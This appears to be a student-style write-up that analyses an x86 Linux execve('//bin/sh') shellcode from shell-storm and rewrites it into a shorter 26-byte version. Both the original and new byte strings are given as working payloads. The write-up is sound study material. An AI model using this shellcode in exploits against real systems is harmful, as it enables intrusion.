# Execve

[http://shell-storm.org/shellcode/files/shellcode-863.php](http://shell-storm.org/shellcode/files/shellcode-863.php)


# Disassembly

Here I have commented on the high level functionality of the shellcode.


```x86asm
global _start

section .text
global _start

section .text
_start:
    jmp short here

me:
    ; pop esi
    ; mov edi,esi
    pop edi

    xor eax,eax
    push eax    ; push 0x0    
    mov edx,esp
    
    push eax    ; push 0x0
    add esp,3   ; jump over edx
    ; lea esi,[esi +4]
    lea esi,[edi +4]    ; load string to stack "n/sh"
    xor eax,[esi]
    push eax    
    xor eax,eax
    xor eax,[edi]   ; load string to stack "//bi"
    push eax
    mov ebx,esp 

    xor eax,eax     ; again push "//bin/sh" to stack, load into ecx for argument
    push eax
    lea edi,[ebx]
    push edi
    mov ecx,esp

    mov al,0xb      ; execve()
    int 0x80

here:
    call me
    path db "//bin/sh"

```

Shellcode (length: 49 bytes)

```c
"\xeb\x23\x5f\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x77\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd8\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73"
```


# Changes

First, I remove the jmp, call, pop technique instructions that gets a pointer to the string "//bin/sh" as I will be pushing it to the stack later. 

I then push the string to the stack with the following instructions instead of moving the data as the original shellcode did using `lea`.

The commented code is what was removed from the original and replaced with my instructions.

```x86asm
; push eax            ; load "//bin/sh" to stack
; add esp,3
; lea esi,[esi +4]
; xor eax,[esi]
; push eax
; xor eax,eax
; xor eax,[edi]
; push eax
; mov ebx,esp 
push eax
push 0x68732f6e         ; "hs/n"
push 0x69622f2f         ; "ib//"
mov ebx, esp
```

Next, I also change the way the second argument is loaded onto the stack by leveraging the ebx pointer to the string "//bin/sh". To do this, I just push a null `eax` which doesn't have to be `xor`'d since it was not touched in my previous instructions. Then push the pointer to "//bin/sh" that is currently in `ebx` and move this pointer to `ecx`.
```x86asm
; xor eax,eax
; push eax
; lea edi,[ebx]
; push edi
; mov ecx,esp
push eax
push ebx
mov ecx, esp
```



# Completed Shellcode

```x86asm
global _start

section .text
_start:
    ; jmp short here

me:
    ; pop esi
    ; mov edi,esi
    
    xor eax,eax     ; push ptr to 0x0 to stack for edx argument 
    push eax
    mov edx,esp    

    ; push eax            ; load "//bin/sh" to stack
    ; add esp,3
    ; lea esi,[esi +4]
    ; xor eax,[esi]
    ; push eax
    ; xor eax,eax
    ; xor eax,[edi]
    ; push eax
    ; mov ebx,esp 
    push eax
    push 0x68732f6e         ; "hs/n"
    push 0x69622f2f         ; "ib//"
    mov ebx, esp


    ; xor eax,eax
    ; push eax
    ; lea edi,[ebx]
    ; push edi
    ; mov ecx,esp
    push eax
    push ebx
    mov ecx, esp


    mov al,0xb      ; execve()
    int 0x80

; here:
;     call me
;     path db "//bin/sh"
```

New Shellcode (Length: 26)

```c
"\x31\xc0\x50\x89\xe2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```